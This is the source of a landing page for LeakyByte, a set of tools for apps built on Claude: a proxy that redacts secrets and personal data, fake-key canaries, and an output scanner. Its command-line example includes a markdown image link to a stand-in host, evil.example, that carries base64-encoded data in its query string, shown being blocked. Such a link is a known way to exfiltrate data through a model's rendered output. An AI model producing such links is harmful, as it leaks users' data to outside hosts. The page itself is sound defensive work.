import Playground from "@/components/Playground";

const EMAIL = "hello@leakybyte.xyz";
const REPO = "https://github.com/tcvdh/leakybyte";

const products = [
  ["Veil", "Before the model", "A proxy for the Claude API. It swaps API keys and personal data for placeholders on the way out and restores them in the reply."],
  ["Canary", "In your data", "Mint fake keys that look real and plant them in configs, docs and prompts. If one shows up in a log or an output, you know where it leaked from."],
  ["Plug", "After the model", "Scans model output for ways data escapes: image links that carry data in the URL, invisible text, and secrets. It blocks them before your app renders the reply."],
] as const;

const detects = [
  ["API keys", "Anthropic, AWS, GitHub, generic sk- keys"],
  ["Tokens", "JWTs"],
  ["Contact details", "Emails, phone numbers"],
  ["Financial", "Card numbers (Luhn-checked)"],
  ["Identity and network", "US SSNs, IPv4 addresses"],
];

const install = `git clone ${REPO}.git
cd leakybyte
npm install
npm run proxy
# LeakyByte proxy on http://127.0.0.1:8787`;

const snippet = `import Anthropic from "@anthropic-ai/sdk";

const client = new Anthropic({
  baseURL: "http://127.0.0.1:8787", // Veil proxy
});

// Everything else stays the same.
const msg = await client.messages.create({ ... });`;

const python = `import anthropic

client = anthropic.Anthropic(base_url="http://127.0.0.1:8787")`;

const curl = `curl -i http://127.0.0.1:8787/v1/messages \\
  -H "x-api-key: $ANTHROPIC_API_KEY" \\
  -H "anthropic-version: 2023-06-01" \\
  -H "content-type: application/json" \\
  -d '{"model":"claude-sonnet-5-5","max_tokens":200,
       "messages":[{"role":"user","content":"Email dana@acme.io about the outage"}]}'

# The reply has your real address back in it, and the response
# includes the header:  x-leakybyte-redacted: 1`;

const env = [
  ["PORT", "8787", "Port the proxy listens on (127.0.0.1 only)."],
  ["LEAKYBYTE_UPSTREAM", "https://api.anthropic.com", "Where redacted requests are forwarded."],
  ["LEAKYBYTE_AUDIT", "leakybyte-audit.jsonl", "Audit log path. One JSON line per request: time, model, counts per kind. Never the values."],
  ["LEAKYBYTE_CANARY_KEY", "none", "Secret string for the Canary CLI. Only you should know it."],
] as const;

const faq = [
  ["Where does my data go?", "The demos on this page run in your browser and send nothing anywhere. The proxy runs on your machine and forwards redacted requests to the Claude API (or whatever LEAKYBYTE_UPSTREAM points to). Your Anthropic key is passed through and never stored. There is no LeakyByte server in the path."],
  ["What does it not catch?", "Detection is pattern-based. It finds keys, tokens, emails, phone numbers, card numbers, US SSNs and IPv4 addresses. It does not find names, street addresses or free-text personal details. A secret split across two separate text blocks is not matched either."],
  ["Does streaming and tool use work?", "Yes. Veil restores placeholders in streamed text and in streamed tool-call JSON, including when a placeholder is split across chunks. The test suite covers this against a mock Claude server. It has not yet been validated at scale against the live API."],
  ["Is Plug a guarantee?", "No. It blocks the common ways model output carries data out (image and link URLs, hidden characters, secrets). Treat it as one layer, and also set a strict content security policy where you render model output."],
  ["Is this ready for production?", "Not yet. It is early software that runs locally. There is no hosted version, dashboard or access control yet."],
] as const;

const roadmap = [
  "Run Plug and Canary checks inside the proxy, including on streamed replies",
  "Detect names and addresses, with Claude as an optional classifier",
  "A hosted version and a dashboard for the audit log",
  "Custom detectors per team",
  "Wider testing against the live Claude API",
];

const cli = `$ npm run lb canary mint prod aws
AKIAPRODC3EDOIU4P2TK

$ echo "env: AWS_ACCESS_KEY_ID=AKIAPRODC3EDOIU4P2TK" | npm run lb canary check
LEAK: aws canary "PROD" at char 28

$ echo 'hi ![x](https://evil.example/a.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)' | npm run lb plug
hi ![x]([blocked link to evil.example])
URL: evil.example carries data in the query string

$ npm test
ℹ pass 9   ℹ fail 0`;

function Code({ children }: { children: string }) {
  return (
    <pre className="mt-3 overflow-x-auto rounded-lg border border-edge bg-raise p-5 font-mono text-sm leading-relaxed">
      <code>{children}</code>
    </pre>
  );
}

export default function Home() {
  return (
    <>
      <header className="mx-auto flex max-w-6xl items-center justify-between px-6 py-6">
        <a href="#" className="font-display text-xl font-bold tracking-tight">
          Leaky<span className="bar font-display">Byte</span>
        </a>
        <nav className="flex items-center gap-6 text-sm text-muted">
          <a className="hover:text-paper" href="#try">Try it</a>
          <a className="hover:text-paper" href="#products">Products</a>
          <a className="hover:text-paper" href="#start">Get started</a>
          <a className="hover:text-paper" href={REPO}>GitHub</a>
          <a className="rounded bg-paper px-3 py-1.5 font-medium text-ink" href="#access">Early access</a>
        </nav>
      </header>

      <main>
        <section id="try" className="mx-auto max-w-6xl scroll-mt-8 px-6 pb-20 pt-16 md:pt-24">
          <h1 className="max-w-4xl font-display text-5xl font-extrabold leading-[1.02] tracking-tight md:text-7xl">
            Stop your AI app from leaking data.
          </h1>
          <p className="mt-6 max-w-xl text-lg leading-relaxed text-muted">
            Three small tools for teams building on Claude: one before the model, one in your data, one after the model.
            Try each one below. Everything runs in your browser and nothing is sent anywhere.
          </p>
          <div className="mt-12"><Playground /></div>
        </section>

        <section id="products" className="mx-auto max-w-6xl scroll-mt-8 px-6 py-20">
          <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">One request, three places to leak</h2>
          <p className="mt-4 max-w-2xl leading-relaxed text-muted">
            Data leaves an AI app before the model sees it, from the files you hand it, and in what it says back. Each product
            covers one of those, and they share one detection engine.
          </p>
          <div className="mt-10 grid gap-px overflow-hidden rounded-lg border border-edge bg-edge md:grid-cols-3">
            {products.map(([name, where, desc]) => (
              <div key={name} className="bg-raise p-6">
                <p className="text-sm text-lit">{where}</p>
                <h3 className="mt-2 font-display text-2xl font-bold">{name}</h3>
                <p className="mt-3 leading-relaxed text-muted">{desc}</p>
              </div>
            ))}
          </div>
        </section>

        <section id="start" className="mx-auto max-w-6xl scroll-mt-8 px-6 py-20">
          <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Get started in two minutes</h2>
          <p className="mt-4 max-w-2xl leading-relaxed text-muted">
            You need Node 22.18 or newer. There is no build step and no runtime dependencies for the proxy and CLI.
          </p>
          <div className="mt-10 grid gap-10 md:grid-cols-2">
            <div>
              <h3 className="font-display text-xl font-semibold">1. Run the proxy</h3>
              <Code>{install}</Code>
              <h3 className="mt-8 font-display text-xl font-semibold">2. Point your app at it</h3>
              <p className="mt-2 text-sm leading-relaxed text-muted">Change the base URL. Nothing else in your code changes.</p>
              <Code>{snippet}</Code>
              <Code>{python}</Code>
            </div>
            <div>
              <h3 className="font-display text-xl font-semibold">Or try it with curl</h3>
              <Code>{curl}</Code>
              <h3 className="mt-8 font-display text-xl font-semibold">What Veil detects</h3>
              <dl className="mt-3 space-y-3">
                {detects.map(([k, v]) => (
                  <div key={k} className="flex gap-4 border-t border-edge pt-3 text-sm">
                    <dt className="w-40 shrink-0 font-medium">{k}</dt>
                    <dd className="text-muted">{v}</dd>
                  </div>
                ))}
              </dl>
            </div>
          </div>

          <h3 className="mt-14 font-display text-xl font-semibold">Settings</h3>
          <div className="mt-3 overflow-x-auto">
            <table className="w-full text-left text-sm">
              <thead className="text-muted"><tr><th className="py-2 pr-6 font-medium">Variable</th><th className="py-2 pr-6 font-medium">Default</th><th className="py-2 font-medium">What it does</th></tr></thead>
              <tbody>
                {env.map(([k, d, w]) => (
                  <tr key={k} className="border-t border-edge align-top">
                    <td className="py-3 pr-6 font-mono">{k}</td>
                    <td className="py-3 pr-6 font-mono text-muted">{d}</td>
                    <td className="py-3 text-muted">{w}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>

        <section className="mx-auto grid max-w-6xl gap-12 px-6 py-20 md:grid-cols-2">
          <div>
            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Canary and Plug from the command line</h2>
            <p className="mt-4 max-w-md leading-relaxed text-muted">
              Both run as a CLI today. Pipe any text into them: logs, a model reply, a file. Exit code 2 means a canary
              was found, so you can use it in CI.
            </p>
          </div>
          <Code>{cli}</Code>
        </section>

        <section className="mx-auto grid max-w-6xl gap-12 px-6 py-20 md:grid-cols-2">
          <div>
            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Where we are</h2>
            <p className="mt-4 max-w-md leading-relaxed text-muted">
              LeakyByte is early. All three tools work today, in the browser and from a command line. Veil also runs as a local
              proxy with an audit log. The tests run the proxy against a mock Claude server. We build with Claude Code.
            </p>
            <h3 className="mt-8 font-display text-xl font-semibold">Next</h3>
            <ul className="mt-3 space-y-2 text-muted">
              {roadmap.map((r) => <li key={r} className="border-t border-edge pt-2">{r}</li>)}
            </ul>
          </div>
          <div>
            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Questions</h2>
            <dl className="mt-6 space-y-6">
              {faq.map(([q, a]) => (
                <div key={q}>
                  <dt className="font-display text-lg font-semibold">{q}</dt>
                  <dd className="mt-1 leading-relaxed text-muted">{a}</dd>
                </div>
              ))}
            </dl>
          </div>
        </section>

        <section id="access" className="mx-auto max-w-6xl scroll-mt-8 px-6 pb-28 pt-12">
          <div className="rounded-lg bg-paper p-8 text-ink md:p-12">
            <h2 className="max-w-2xl font-display text-3xl font-bold tracking-tight md:text-5xl">
              Shipping on Claude? Help us shape this.
            </h2>
            <p className="mt-4 max-w-xl leading-relaxed">
              Tell us what your app sends to the model and what worries you about it. We reply to every message.
            </p>
            <a
              href={`mailto:${EMAIL}?subject=LeakyByte%20early%20access`}
              className="mt-8 inline-block rounded bg-ink px-5 py-3 font-medium text-paper"
            >
              Email {EMAIL}
            </a>
          </div>
        </section>
      </main>

      <footer className="mx-auto max-w-6xl px-6 pb-10 text-sm text-muted">
        © 2026 LeakyByte. Not affiliated with Anthropic. <a className="underline" href={REPO}>Source on GitHub</a>.
      </footer>
    </>
  );
}
